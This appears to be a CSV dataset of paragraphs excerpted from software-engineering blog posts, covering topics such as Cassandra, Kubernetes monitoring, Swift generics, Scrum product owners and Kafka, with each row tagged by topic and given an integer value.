1774,"The following diagram shows the various components and their interaction within this pattern: Lets go over the functionalities of each of these: Data Source The Data Source is responsible for providing data to the entire system. This can be any generic class conforming to a protocol that is used by the Controller to ask for data. The data can be stored internally in any way. All that detail is internal to the implementation of Data Source. Conforming to a protocol ensures that we can replace the data source implementation without affecting any other component. All we need is for the new class to conform to the data source protocol, and we wont have to change any other aspect. Given the Controller owns the Data Source, any changes in the underlying data are conveyed to the Controller that can then initiate appropriate action for it.","['Innovation', 'Technology', 'Engineering', 'Design Patterns', 'Mvvm']",15
1775,"Controller The controller is at the centre of it all though much of its responsibility is to coordinate other items to enable them to function together. Usually this is a View Controller subclass, which is initialised with a Data Source object. Suppose we have to implement a chat screen, which shows all messages and has ability to send messages. The main chat view controller will act as the Controller. The table view to show all messages would be a part of the chat view controller. The initialisation would look something like this: View The independent UI components can be separated out in a separate View layer. The Controller instantiates and holds references to them.","['Innovation', 'Technology', 'Engineering', 'Design Patterns', 'Mvvm']",15
1776,"The View is passed as a View Model object that the View uses to populate itself. In case of our example, the cells of the table View can be initiated with this pattern, where we pass them a View model object to populate with: View Model The View Model is instantiated by the Controller for the independent View components that need not be part of the Controller class. Identifying such View-View Model components can help keep your Controller light and code modular. The View Model is initialised with a Model object that contains all information needed by the view to populate itself. The other important aspect to it is that we dont expose class names anywhere, we only expose id<some_protocol> type of objects. This makes it easier to replace these components without affecting any other components: Action Handler The view reports all user actions taken on it back to the Controller. In order to keep the Controller independent of the business logic behind all such user actions, we place all this logic in a separate component called Action Handler. This component gets the information regarding the type of action (say single touch, long press etc.) from the Controller, and applies all business logic to handle that event: It is important here to note that while the Action Handler has all the logic to execute in response to any user action, it doesnt actually perform any UI operations itself. Any UI operation, be it adding/removing a subview, or pushing/presenting any other View Controller should only be done by the Controller. As we can see in the above snippet, the Action Handler returns a Response Model object. This object contains all information about the kind of UI task that needs to be performed: Based on the value of the action type, the Controller picks the appropriate UIView or UIView Controller from the Response Model object and performs necessary operations on it. Thus, there is a clear separation of responsibility between the Controller and the Action Handler.","['Innovation', 'Technology', 'Engineering', 'Design Patterns', 'Mvvm']",15
1777,"In this sample app I have used the jdbc Job Store. In spring-boot quartz provides two Job Stores MEMORY It keeps all of its data in RAM so once the application ends or crashes all the scheduling information is lost. Since it keeps its data in RAM, it is very fast and simple to configure JDBCJDBC Job Store keeps all of its data in a database via JDBC. Since it relies on database, configuration is a bit complicated and certainly is not as fast as RAM Job Store If you need to manage jobs on your own and modify them time to time without effecting the up-time of your application you should move to the JDBC job store. You can run clustered or non-clustered scheduler service when using the JDBC job store.","['Quartz', 'Scheduler', 'Spring Boot', 'Java']",8
1778,"The traditional request-driven model and the event-driven model are complementary, and both of them have their own purposes. Digital companies are usually called to specific business actions triggered by business situations. Business situations are nothing more than the result of a logical test to an income of different events, and the identification of this situation creates an opportunity. These opportunities are mostly lost in a traditional request-driven model, which creates rigid and orchestrated architectures that are certainly very efficient when developing simple and invariant tasks. EDA, when using continuous monitoring of incoming events, gives the possibility of making real-time decisions. [2]Experts say [3] that digital entrepreneurs and IT architects must change to the event thinking to adopt this kind of solutions, that are diametrically opposed to the old paradigm.","['Innovation', 'Digital Business', 'Event Driven', 'Software Development', 'Technology Trends']",12
1779,"Just as an off-topic, one can check a Brownian motion simulation here.","['Innovation', 'Digital Business', 'Event Driven', 'Software Development', 'Technology Trends']",5
1780,"Now lets ask another question, how many orders did we have after a certain date:-Whats going on? This is valid SQLThe problem revolves around our primary key. For Cassandra, the primary key tells it exactly where to look for the data we want. A primary key of,means that we have a partition keyed by customer_id and within that partition the data is ordered in order of order_id. To perform the query shown above, Cassandra doesnt know where the data is stored so it will have to perform a full table scan. Essentially this is what the ALLOW FILTERING flag is saying we should do.","['Cassandra', 'Data', 'NoSQL']",8
1781,"Now lets consider the scenario where we want to delete this row from the database:-What if one of these requests fails? Depending on the consistency set on your delete query, this may fail entirely or will succeed leading to the two nodes will report inconsistent results. If we consider the second case, when we ask the two nodes for this data again, one will think the data is still there and the other will say its deleted. How can Cassandra distinguish the missing data came from a user explicitly deleting data? The mechanism Cassandra implements to solve this problem is by writing tombstones. When a user requests to delete data, it actually writes a tombstone next to that data and doesnt delete anything. Deletes are treated just like any other write.","['Cassandra', 'Data', 'NoSQL']",8
1782,"Originally, it just built the pull request to verify that builds in master would not break. This actually allowed us to catch a lot of small issues; an accidentally added character; multiple merges not resolving correctly. It allowed us to keep our master branch always ready to release. Lately, we have also included unit tests and UI tests in this pipeline. All these tests are run on different i OS versions, allowing us to make sure our builds and tests pass everywhere and giving all of us a great reason to add even more tests.","['Continuous Integration', 'iOS', 'Fastlane', 'Buildkite', 'Engineering']",18
1783,"Releasing to the App Store 23 times a month, features getting added daily, bugs being fixed around the clock. We needed to make sure that everything always works and looks amazing. To help us achieve this, anytime a pull request is merged in a new release is made available on Hockey App. A number of our fellow Tinkers, our design team and us, the developers, all use our Hockey App releases daily to try out new features and verify that everything still works before it gets before or users. This has become such a draw that all our new hires seek out the i OS team members to give them access to our Hockey App builds.","['Continuous Integration', 'iOS', 'Fastlane', 'Buildkite', 'Engineering']",6
1784,"Relational algebra vs. flow-based functional processing: They believed that a time-series query language needed a flow-based functional model, as opposed to the relational algebra model in SQL. (Theres also a third reason stated in the post: that SQL was invented in the 1970s. This point is odd, especially considering that other foundational technologies were also born in that same era: the relational database, the microprocessor, and the Internet. These technologies, like SQL, have evolved significantly since their initial invention, while other technologies have not. Also, common modern languages such as English were invented hundreds of years ago, and have also evolved over time, while other languages have fallen out of use. So we believe the decade in which something was invented is irrelevant to this discussion. With that in mind, well return to the main discussion. )Lets unpack both of these reasons.","['Sql', 'Query', 'Influxdb', 'Analytics', 'Engineering']",9
1785,"One can similarly write the same function in modern SQL, by creating a custom aggregate. Creating a custom aggregate is supported in most modern SQL implementations, including Postgre SQL. The syntax in Postgre SQL is the following (via Stack Overflow): SQL: Creating the custom aggregate(This is a simple SQL aggregate window function that computes the exponential moving average. It is an aggregate function because it takes multiple input rows, and is a window function because it computes a value for each input row. By comparison, computing a regular SUM would be an aggregate but not a window function, while comparing the delta between two rows would be a window function but not an aggregate. )Then querying for the exponential moving average of the entire dataset can be rather simple: SQL 2: This function also allows you to calculate the EMA not just across time, but also by any other column (e.g., symbol). In the following example, we calculate the EMA for each different stock symbol over time: SQL 3:(You can see more at this SQL Fiddle. )Yes, writing a new function requires some work, but less work than learning a whole new language, not to mention forcing everyone else (who could just use the same function) to learn that language.","['Sql', 'Query', 'Influxdb', 'Analytics', 'Engineering']",8
1786,"One could also argue that creating new functions (or aggregates) breaks the SQL standard. Having a standard is valuable for two reasons: code portability, and skills re-use. Here we find that extending SQL is still a superior path than using a new query language. While creating new functions in SQL reduces code portability, it does so far less than adopting a non-standard language. And because the new function syntax is quite similar (if not equivalent) to the standard, it allows database users to leverage their existing knowledge from other systems, which would not be possible with a non-standard language. And SQLs extensibility allows you to mold the language around your problem domain.","['Sql', 'Query', 'Influxdb', 'Analytics', 'Engineering']",9
1787,"Given a query of reasonable complexity on a database of reasonable capability, database users will rarely have the expertise to determine which method is best. Furthermore, even if some users have that expertise, they may not have the right context, because the best method often depends on data properties that can change over time (e.g., the number of distinct items vs. available machine memory for choosing an in-memory or spill-to-disk sort method). Pushing these decisions to the planner reduces the burden on developers. (There is a parallel here with software development and compilers. Today, it makes more sense to write clean code and allow the compiler to optimize it, and not optimize by hand in code. )This is why enterprise databases since System R in the 1970s have used a declarative language combined with a query planner to push this decision to the database and not the programmer.","['Sql', 'Query', 'Influxdb', 'Analytics', 'Engineering']",9
1788,"Having many POs encourages micro management of teams. In a Product Owner per team situation, the PO becomes the person that spells out all the detailed specs (user stories). This setup leads to teams focusing on story readiness, negotiating the level of story detail instead of focusing on value creation. This is a well known pattern known as the contract negotiation game. Another effect is the growing absence of domain expertise in the teams. Domain knowledge is concentrated in the PO, which makes the team stick to executing tasks (opposed to solving customer problem), which re-enforces the need for more POs. The PO per team setup reduces opportunities for learning and self-organization. I normally suggest to make the POs part of the development teams they work with. They will get the opportunity to become multi-skilled development team member with a focus on analysis.","['Agile', 'Serious Scrum', 'Product Owner', 'Scrum', 'Scrum Master']",0
1789,"Many POs requires coordination and alignment. The POs decide in a PO team to agree who takes care of which items on the Product Backlog. The customer features are sliced and each PO gets their own sub-scope of the customer value in a Product Backlog. The work is sliced on arbitrary and artificial grounds, creating a coordination need to deliver an integrated product by the end of the sprint. Also, prioritization is decentralized and will lead to local optimization per backlog. This inevitably introduces asynchronous dependencies between teams, as some teams are full and cannot do certain work other Teams depend upon. Teams dont have a whole product view and loose track of what is customer value. If the coordination need is high between POs, then probably the Product Backlog has not been sliced to optimize for minimal dependencies and the teams are not structured to serve that goal. Having only one PO managing a single Product Backlog for multiple teams creates the transparency required for proper empiricism.","['Agile', 'Serious Scrum', 'Product Owner', 'Scrum', 'Scrum Master']",10
1790,"Many POs bring unclear responsibility and ownership. One PO means that one person is accountable for the ROI on the product under development. With multiple Product Owners, accountability, responsibility and ownership are oblique. Management has a tough job getting a grip on Product development as there is no single neck to wring. Multiple POs stimulates part-time jobs,by adding the PO work to someones existing workload. This introduces a conflict of interest. With multiple people working part-time on one product the situation does not get any better. Volunteers come to the rescue, thinking if nobody takes care of this, then I will and change backlog item priority, add items or even create their own backlog, creating more complexity. In such cases I suggest to restore transparency by extending the Definition of Done gradually to include the work described in the additional backlogs or simply merge them into one single Product Backlog.","['Agile', 'Serious Scrum', 'Product Owner', 'Scrum', 'Scrum Master']",12
1791,"If your PO cannot handle the work involved managing the product:- Being a PO is a difficult job and not everybody can do it. Hire someone else, or maybe you can fix it by sending the PO to a proper training.- Reduce the number of features (user stories) in the backlog, they are probably too detailed. Aggregate specs to a low number (3 to 5 stories per team per sprint) to experiment with.- Stimulate prioritization over clarification. Reduce the level of detail at which the PO is dealing with features by explicitly bringing the clarification responsibility in the team. The PO can help by connecting the team to a stakeholder or customer.- Limit the planning horizon to no more than 2 to 3 sprints of work ahead, as preparing more work is likely to result in waste. If you are able to predictably specify your work more than 3 sprints ahead you maybe should not be doing Scrum as your product is not complex enough.- Prevent the Product Backlog from spawning by extending the Do D, continuously reducing technical debt with merciless refactoring and strict bug policies.","['Agile', 'Serious Scrum', 'Product Owner', 'Scrum', 'Scrum Master']",1
1792,"The PO role is better not scaled by multiplying POs as this has many downsides. I encourage to have a single Product Backlog and a single PO being responsible for return on investment when developing one product. Having a single Product Owner creates transparency and enables proper empiricism. The concept of a single Product Owner in a scaled environment (multiple teams working on a single product) is challenging if you stick to the idea that the PO has to manage every detail. When scaling, try shifting the PO focus from clarification to prioritization. This will encourage the teams to better understand what needs to be created for the product. This approach is completely in line with backlog management described in the Scrum guide: This article originally appeared on https://agilix.nl/blog/.","['Agile', 'Serious Scrum', 'Product Owner', 'Scrum', 'Scrum Master']",1
1793,"Doc DBs sharding, replication and transactions designs are inspired by the designs outlined in the Spanner papers. The most important benefit of this choice is that no single component of the database can become a performance or availability bottleneck for geo-distributed, random access SQL-based OLTP workloads. Transactional database designs proposed in other papers such as Yales Calvin, Amazons Aurora and Googles Percolator cannot guarantee this benefit. The single global consensus leader used for transaction processing in Calvin can itself become the bottleneck. Additionally, critical SQL constructs such as long-running session transactions and high-performance secondary indexes are not possible in Calvin. Amazons Aurora uses a monolithic SQL layer on top a distributed storage layer, thus suffering from lack of horizontal write scalability. And finally, Googles primary rationale for building Spanner was to address the lack of low-latency distributed transactions in Percolator.","['Database', 'Postgres', 'Google Spanner', 'Software Engineering', 'Sql']",8
1794,"The second part of the problem is when the nodes should serve reads. This is accomplished by using the HLC is to track the read point as well. The read point determines which updates should be visible to end clients. In the case of single-row updates, the leader issues the update an HLC value. An update that has been safely replicated onto a majority of nodes as per the Raft protocol can be acknowledged as successful to the client and it is safe to serve all reads up to that HLC. This forms the foundation for multi-version concurrency control (MVCC) in Doc DB.","['Database', 'Postgres', 'Google Spanner', 'Software Engineering', 'Sql']",11
1795,"The idea that we can categorize developers and engineers into junior vs. mid-level vs. senior suggests there is some way to measure. The mistake here is pretending there is a single scale of measuring talent when there isnt. Different organizations, problem sets, and domains suggest very different skills. But there are four key abilities to use in measuring seniority: Being a sole programmer Mentoring and growing other programmers Navigating social and political issues inside an organization Matching technical solutions to business needs Ideally, a senior engineer should be strong at all four of these skillsets, but its more critical that their strengths complement the team and company and their needs. So the relative importance of these four skills can vary widely. For example, in a small company or startup, skill as a sole programmer and the ability to grow other programmers typically matters far more than social and political skills.",[''],12
1796,Before diving into the advantages and features of kube eagle let me start explaining the use case and why we needed a better monitoring.,"['Kubernetes', 'Kubernetes Engine', 'Prometheus', 'Grafana']",10
1797,"Apparently the kubernetes scheduler didnt schedule our workloads so that they are equally distributed across our available resources. The kubernetes scheduler has to respect various configurations, e. g. affinity rules, taints & tolerations, node selectors which may restrict the set of available nodes. In my use case there were none of these configurations in place though. If thats the case the pod scheduling is based on the requested resources on each node.","['Kubernetes', 'Kubernetes Engine', 'Prometheus', 'Grafana']",11
1798,"JVM applications take as much RAM as they can. The garbage collector only releases memory if more than ~75% RAM is in use. Since most services were burstable in RAM, it was always consumed by the JVM. Thus we had much higher RAM usages on all these Java services than expected Some applications had way too large RAM requests which caused the Kubernetes scheduler to skip these nodes for all the other applications, even though the actual usage was lower than on all other nodes. The large RAM request was accidentially caused by a developer which specified resource requests in bytes and added another digit by accident. 20Gb RAM instead of 2Gb RAM have been requested and no one ever noticed it. The application had 3 replicas and thus 3 different nodes were affected by that over allocation.","['Kubernetes', 'Kubernetes Engine', 'Prometheus', 'Grafana']",3
1799,"To generate a core dump on Linux, run the following: If you are on OS X, you can run the following: Both commands will create a core dump in the current working directory with the name core.74262, and now we can use llnode to open it. llnode takes one required argument, which is the binary you want to debug (in this case, node) and a variety of optional arguments. Since we want to debug a core dump, we need to tell llnode where the core dump file is with -c {core-file}. The final command will look like: Lets start with a command that prints information about N __url__ and its dependencies. This command will also help us understand the syntax of the commands for llnode. On the (llnode) prompt, type v8 nodeinfo and press Enter:llnode commands are prefixed by v8 + a space. This will help you distinguish between llnode and lldb commands. Speaking of help, v8 help will be your best friend from now on: Yes, theres a lot of information there. But dont worry, well go through the interesting commands now.v8 findjsobjects lists all object types alongside their sizes and quantities. This is useful to find out which object types are using most of your memory. The first time you run this command might take a few minutes to process, so do not worry if that happens.","['Nodejs', 'Llnode', 'Debugging']",7
1800,"Theres also a detailed version of this command which can be called with v8 findjsobjects -d. The result will group types with the same attributes and number of elements, and will also provide the address to an example object of that type.v8 findjsinstances gives you a list with all objects of a given type. It also has a detailed version which can be called with v8 findjsinstances -d. This will print all objects of a given type with their attributes and elements.v8 findjsinstances -d accepts the same arguments you can pass to v8 inspect, which we will see next.v8 inspect prints all attributes and elements of a given object. It can also print additional information, such as the address to the object's map. If you want to see the object's map address, you should run v8 inspect -m. You can inspect the map like any other object by using v8 inspect.","['Nodejs', 'Llnode', 'Debugging']",15
1801,"Now we know how to find which types are using a huge amount of memory, how to find objects of those types and how to inspect attributes of those objects. But if we want to find memory leaks, we will need to find what is keeping those objects in the memory. In other words, we need to find other objects referencing them. There's a command perfect for that: v8 findrefs. This command will return all objects referencing another object. Let's give it a try: The result shows us that there is an array holding a lot (156027) of objects, and is probably the reason we have so many Visit objects in memory (spoiler: it is, look at line 13 and 16 of our server). Unfortunately, llnode cannot tell where this array is located yet, but there is an open issue to add this feature in the future.","['Nodejs', 'Llnode', 'Debugging']",3
1802,We dont really expect senior IT execs to open up an IDE and start committing code. But what if you just hired a programmer that could not even write a single line of code? That was the other thing that fascinated me about Niranjans post. About 60% of the candidates for an engineering position either do not submit a solution to a simple programming challenge or do not even know the basics. Which makes we wonder what jobs these folks are finding? There is this coding challenge that an engineer created several years ago based on the childrens game Fizz Buzz. He wrote this as a way to weed out candidates that struggle with tiny problems. Even a good number of computer science grads were stymied.,"['Programming', 'Programmer', 'Coding', 'Talent Acquisition', 'Developer']",2
1803,"Now this is not an opportunity to show me your elegant version of Fizz Buzz. Jeff Atwood already documented the many places Fizz Buzz solutions reside. Apparently that is what happens when you comment on the subject. But Jeff brings up a really good point: Why are we seeing this? How is it even a thing? Would we be so casual if we came across the same thing with doctors? Imagine the conversation in the OR: Then again if developers are writing the script for the future, our doctors may end up becoming robots, run by software written by engineers that may or may not know the answer to Fizz Buzz.","['Programming', 'Programmer', 'Coding', 'Talent Acquisition', 'Developer']",12
1804,"But back to the topic, it means finding developers is not getting easier. There are an increasing number of candidates, especially with the influx of coding bootcamps and academies. But again, how many are even prepared to solve Fizz Buzz after graduating? How do you find truly talented or potentially talented programmers? It is increasingly clear that the traditional ways of hiring are not working at the scale that is required by many companies. I highlight a few ideas to help reorient your strategy: Double down on internships. As Joel says towards the end of this post, the great developers are never on the job market. It is best to get them before they even hit the market, while they are in school.","['Programming', 'Programmer', 'Coding', 'Talent Acquisition', 'Developer']",2
1805,"Thanks to feedback from our incredibly helpful cohort of single-subject newsrooms and steadily expanding userbase, weve got a lot of ideas for the future! Since were constantly adapting to the needs of our users, Id consider the following list a brainstorming exercise: were not committing to these features just yet, and we certainly dont know what order we would implement them in. We hope you will chime in with your thoughts and guidance! Support for email services beyond Mail Chimp Reporting of additional metrics (including some more of those from the notebooks)Benchmarks tailored to organizations like yours Ability to analyze subsets of your mailing list, including through the use of segments, interest categories, and merge tags Web dashboards which break down the aggregate data we collect A lot! As an engineer, Ive never been closer to the end user while working on a project. Ive gotten much better at processing and iterating on the amazing amount of feedback weve received. The result has been a piece of software that a lot of people will (hopefully) actually want to use, and that will save journalism along the way! Our long-term goal lines up with that of the Shorenstein Center more broadly: to assist media organizations in facing some big economic challenges. To that end, were still thinking about how best to present all the metrics in a meaningful and statistically rigorous way. One idea is publishing a more formal industry benchmark report once we have a meaningful sample size.","['Data Science', 'Media', 'Email Marketing', 'Audience Growth', 'Nonprofit News']",6
1806,"This afternoon, I met with BBC R&D to discuss how we could centralise the BBC on a single bot story data format. Then it should be easy to support bots across all content, all channels and right across the Corporation. But that conversation immediately turned into what, to me, is a much more interesting discussion: Can we use bots to make it a very normal, standard thing for an audience to talk back to news organisations? And if we had real twoway conversation with audiences, how could that change news gathering? On sunny days, you might find us in Cavendish Square. On rainy days, we might be in the BBCs Media Cafe overlooking the newsroom. And regardless of the weather, youll almost always find a Labber restocking our biscuit tin or making a round of afternoon teas or coffees for the team.","['Journalism', 'Innovation', 'Technology', 'Hiring', 'Software Engineering']",6
1807,"If youre reading this, the chances are you already know the benefits of working with generics. You want the code you write to do more. The chances are you have previously tried using generics in your programming only to reach heights of frustration you never thought possible. Being able to work in a generic way but still successfully infer your types can be tricky. Luckily, combining the use of generics with protocols is really effective, and once you learn a small number of techniques youll find that this tricky thing is actually not so tricky after all.","['Swift', 'iOS', 'Protocol', 'Software Development', 'Generic Programming']",9
1808,"Our hypothetical situation is that we have an entity called Product, and we want to be able to filter an array of products by some kind of specification. Lets first take a look at Product: Now, we want to build a Filter which accepts an array of product instances and returns only those which meet a certain specification. For example, we may want our filter to return only small products. The naive approach would most likely look something like this: We can see from the print out (line 23), that this approach works just fine, but even a little probing reveals its total inflexibility: What if we want to filter objects that are not of type Product? What if we want to filter by a different attribute? What if we want to filter by more than one attribute? You can imagine all the possible permutations of products and specifications and shudder at the thought of all of the modification that would need to happen to our existing entities. Enter the specification pattern In this first iteration of our pattern, we will make our filtering specifications adopt a uniform interface through the use of a protocol. To use generic types in a protocol use associatedtype T, then you can set the type in your entity using typealias T = Some Type. Here is how we would implement our color and size specifications using this technique.","['Swift', 'iOS', 'Protocol', 'Software Development', 'Generic Programming']",15
1809,"Now instead of setting the specs parameter type as Specification, we can instead use Spec, safe in the knowledge that it has an associatedtype that matches the one in our Filter (line 5). Once the protocol is created, implementing Filter itself is pretty simple. We conform to our protocol (line 9), set the typealias (line 10), and then filter(items:, specs:) magically sets itself up with the correct types. Now we can test with our previously made Product instances At this point we can certainly say that everything works. Creating more filters and specifications is a pretty simple task with our current design. But lets see if we cant refine it more. At the moment, our Color Specification entity will only work with instances of Product type. Wouldnt it make sense for Color Specification to be able to work with any type that has a color? Come to think of it, couldnt we say the same for our Size Specification, and our Product Filter too? Its time to make our entities every bit as generic as our protocols.","['Swift', 'iOS', 'Protocol', 'Software Development', 'Generic Programming']",15
1810,"To make our entities generic, we need to use our generic placeholder syntax, much like we did in our previous section. Heres what it looks like:struct My Struct<T>: Protocol Type { }In this case, when we define our entity we are conforming to our Protocol Type assigning T for the associatedtype. Now we can work with any type at all! When we initialize, we will need to use the syntax:let a = My Struct<Some Type>()Lets now apply this technique to our existing design: The first step is to create protocols for Sized and Colored (lines 28) and have our Product adopt each of them. You will remember that our Product already has the properties defined in the protocols (color and size), so we dont need to add anything to it. Now our two specification entities use <T: Colored> and <T: Sized> to assign the associatedtype (line 15, 24). Because Product conforms to these protocols we can set it as our type, but we can just as easily set any other type as long as it also has the necessary protocol adoption. You will notice that we use <Product> in the instantiation of our Size Specification (line 49); however, this is not needed when creating our Generic Filter because the only place the generic T is used is in filter(items:, specs: ) and the type can be inferred by the checks that we created in the previous section (lines 3637).","['Swift', 'iOS', 'Protocol', 'Software Development', 'Generic Programming']",15
1811,"You will notice that our filter method has an input parameter of type Spec (line 36), so we can only add one instance that conforms to Specification protocol. However, provided that requirement is met, we can actually check for as many attributes as we like. At the moment our Specification types are scalar (single units), but theres no reason why we cant have several Specification types encapsulated within another Specification type. This is called a recursive object. Heres how we can achieve this using a combination of techniques that we have previously explored: There is a whole lot going on in the definition of our And Specification (line 2) so lets break it down. First, notice that our entity conforms to Specification itself, so it can be passed into our filter. We also have two properties of type Spec A and Spec B, each of which conforms to Specification protocol. This means that we have a total of three associated types to satisfy. We do this by, declaring three generic types T, Spec A, and Spec B. To ensure that everything works together, we need to check that our associated types for all three generics are the same. We do this in our where statement. We also need to create a custom initializer (line 7) because all the generic checking is enough for the compiler to be unable to create the member-wise initializer that we come to expect for structs.","['Swift', 'iOS', 'Protocol', 'Software Development', 'Generic Programming']",15
1812,"For instance, Kubernetes implements health checks using readiness and liveness probes. A readiness probe is used to determine if a Pod can serve traffic. Failure of a readiness probe would result in the Pod being removed from the Endpoints that make up a Service, resulting in the Pod not being routed any traffic until the readiness probe succeeds. A liveness probe, on the other hand, is used to indicate if a service is responsive or if its hung or deadlocked. The failure of a liveness probe results in the kubelet restarting the individual container. Consul, similarly, allows for multiple forms of checks, which can be script-based checks or HTTP-based checks that hit a specified URL or TTL based checks or even alias checks.","['Distributed Systems', 'Load Balancing', 'Prometheus', 'Reliability', 'Fault Tolerance']",11
1813,"At any given time, we had a fixed pool of (a dozen or so, if memory serves me right) workers that would be connected to a single Spillway broker. These workers were responsible for performing the actual image transformation (cropping, resizing, PDF processing, GIF rendering and so forth). The workers processed everything from several hundred page PDF files to GIFs with hundreds of frames to plain image files. Another idiosyncrasy of the worker was that while all of the networking was entirely asynchronous, the actual transformation on the GPU itself was not. Considering we were a real-time service, it was impossible to predict what our traffic pattern at any given moment might look like. This required our infrastructure to be capable of self-adapting to different shapes of incoming traffic without requiring any manual operator intervention.","['Distributed Systems', 'Load Balancing', 'Prometheus', 'Reliability', 'Fault Tolerance']",10
1814,"Spillway tracked the health of all the workers in the pool. Spillway would first try to dispatch a request three times in succession to different workers (preferring the workers which were likely to have the original image in their local filesystem and which werent overloaded), and if all the three workers happened to refuse to accept the request, the request would be queued in the in-memory broker. The broker maintained three forms of queuesa LIFO queue, a FIFO queue and a priority queue. If all three queues happened to be full, the broker would simply reject the request, allowing the client (HAProxy) to retry after a backoff period. Once a request was queued in any one of the three queues, any free worker would be able to pop the request off the queue and process it. There are further intricacies around how priorities were assigned to requests and how decisions around which of the three queues (LIFO, FIFO, priority-based) any particular request must be placed in were made, but these are out of the scope of this post.","['Distributed Systems', 'Load Balancing', 'Prometheus', 'Reliability', 'Fault Tolerance']",11
1815,"However, we asked ourselves if databases made sense in the Kubernetes cluster alongside the rest of the application*. We quickly realised wed be sacrificing all of the niceties from managed services for the benefit of well, what? We werent really sure what putting our database in a container gave us. Yes, it prevents our reliance on a managed database service, but that was never really a problem anyway since all of our code worked through connection strings. It just so happened that the connection string pointed at a cloud-providers service. To our code, a database is a databasewherever it lives.","['Kubernetes', 'Database', 'DevOps', 'Containers', 'Software Development']",10
1816,"Do you recognise any of the problems discussed in this article? How are you solving them right now? How much time and energy do you spend working on these issues? Wed love to talk to you. Leave a comment on this post, or contact foundry@ __url__ if youd like to speak with us directly. Were working with a group of people to validate Project Spawn, so if youd like to get involved then get in touch! *Using Stateful Sets and Persistent Volumes in Kubernetes makes this much easier. However, we feel it is still more cost and time effective to use a managed database Paa S offering, dedicating the time you save to building your app which solves the core business problem. Until Kubernetes can offer feature parity with existing database Paa S offerings, we think databases are best placed outside the cluster.","['Kubernetes', 'Database', 'DevOps', 'Containers', 'Software Development']",6
1817,"Last but not least, modern architecture principles, e.g. microservices, make it easy to reduce the lock-in effect. When it is actually necessary to migrate such an application to another environmentwhether its another cloud provider or a classic on-premise data centerit tends to be easy to make decisions in the context of single, simple services. For each service it can be decided if it should be migrated, rebuild, retired or replaced, e.g. Therefore, its not necessary to do the migration with a more risky big bang approach.","['Cloud Computing', 'AWS']",10
1818,"Another argument often is that the cloud providers might suddenly increase the prices for their services. Obviously, this fear is not completely unfounded since nobody knows what the future holds. However, at this point in time we have no evidence for such a move. For example, since its launch back in 2006 AWS has only lowered the prices for their services. Until now, there hasnt been a single time they increased them. Additionally, the services are offered at the same price but over time the feature set has improved dramatically.","['Cloud Computing', 'AWS']",17
1819,"Another fear is that the cloud providers stop offering some services. Actually, the standard contract allows AWS to do so with only a very short grace period. Again, up until now they have not done this a single time. For example, they are still offering Simple DB which they have introduced in December 2007. Since then it basically has been superseded by Dynamo DB. Anyone still using Simple DB for a business critical application should have migrated to Dynamo DB or something else a long time ago. Otherwise, one could ask if this application is really so critical for the business if the necessary investment has not been approved yet.","['Cloud Computing', 'AWS']",11
1820,"Custom authentication middleware We have written a custom authentication middleware which decrypts the JWT and performs a set of checks against it. You may have noticed from the diagram above that when the client web application calls our APIs, in addition to passing the JWT, it also passes the employee ID, roles, and token expiration as headers. Those three pieces of information are also encrypted in the token, so we do a check to make sure that they havent been tampered with. This can tell us if a malicious user is attempting to elevate their privileges or attempting to impersonate someone with admin privileges. When we detect this, we reject the call and log that out, along with the credentials of the user whose token is being used in the attack, and we can event trigger an alert if that happens. This isnt likely with an internal application like oursas of publication, weve never seen this log firebut it would be useful to detect against an active threat in our network.","['API', 'Aspnet', 'Angular', 'Technology', 'Authorization']",11
1821,"HTTP REST APIs are popular as they are easy to set up between services when applications are first developed. A REST API connection is also very efficient as each service is communicating directly with its related services which reduces latency. This direct connection between services, however, poses some unique challenges for engineers. As an application grows and more services are added, complex relationships will need to be formed and API connections remapped, adding time to the development workflow. But what happens when an application is inundated with a sudden influx of data? Services will generally need to be made highly available as one or more particularly slow services may cause the rest of the application to suffer. Finally, none of the services can sustain any downtime as that would generally cause the entire application to crash.","['Microservices', 'Kafka', 'Apache Kafka', 'Software Architecture', 'Software Engineering']",10
1822,"Implementing Kafka, however, can be challenging at times as there isnt a built-in GUI for inspecting the contents of topics and their partitions. Kafka currently only provides a CLI to view messages from topics and their partitions. This can be unintuitive and cumbersome as the commands themselves are very lengthy. Several tools currently exist but most of them are very costly solutions that require some implementation work in themselves. One tool that is gaining popularity is Kafka Lens. Kafka Lens is an open source project that allows developers to view messages as they are being passed through the broker. It even allows for filtering of messages by partitions.","['Microservices', 'Kafka', 'Apache Kafka', 'Software Architecture', 'Software Engineering']",9
1823,"The following 5 clean coding principals are the ones I code by! Theyve given me a massive productivity boost in my work and helped both myself and my colleagues be able to easily interpret and expand the code base which Ive worked on. Hopefully they help you code faster and better too! We know we should always do it, but sometimes we cut corners so we can push the project out faster. But without thorough testing, how will you 100% fully know that the code works? Yes there are very simple pieces of code, but one is always surprised when that crazy edge case comes up that you thought you didnt need to test for! Do yourself and everyone on your team a favour and regularly test the code you write. Youll want to test in a coarse to fine style. Start small with unit tests to make sure every small part works on its own. Then slowly start testing the different subsystems together working your way up towards testing the whole new system end to end. Testing in this way allows you to easily track where the system breaks, since you can easily verify each individual component or the small subsystems as the source of any issues.","['Software Development', 'Coding', 'Technology', 'Computer Science', 'Innovation']",13
1824,"This is what makes code self-documenting. When you read over your old code, you shouldnt have to look over every little comment and run every small piece of code to figure out what it all does! The code should roughly read like plain English. This is especially true for variable names, classes, and functions. Those three items should always have names that are self-explanatory. Rather than use a default name like x for example, call it width or distance or whatever the variable is supposed to represent in read-world terms. Coding in real-world terms will help make your code read in that way Small classes and functions make code approximately 9832741892374 times easier to read.","['Software Development', 'Coding', 'Technology', 'Computer Science', 'Innovation']",9
1825,"First off, they allow for very isolated unit testing. If the piece of code you are testing is small, its easy to source and debug any issues that come up in the test or during deployment. Small classes and functions also allow for better readability. Instead of having a giant block of code with many loops and variables, you can reduce that block to a function that runs several smaller functions. You can then name each of those functions according to what they do and voila, human readable code! One responsibility means you only have to test a handful of edge cases and those cases are quite easy to debug. In addition its quite easy to name the function so it has real-world meaning. Since it only has one single purpose, itll just be named after its purpose, rather than trying to name a function thats trying to accomplish so many different things.","['Software Development', 'Coding', 'Technology', 'Computer Science', 'Innovation']",9
1826,"Theres no such thing as too much logs! Logs are your absolute number 1 source for debugging your code and monitoring your application when its in production. You should be logging every major step your program takes, any important calculations it makes, any errors, exceptions, or out of the ordinary results. It may also be useful to log the date and time that these events occur for easy tracking. All of this will make it easy to trace exactly which step in the pipeline the program failed.","['Software Development', 'Coding', 'Technology', 'Computer Science', 'Innovation']",13
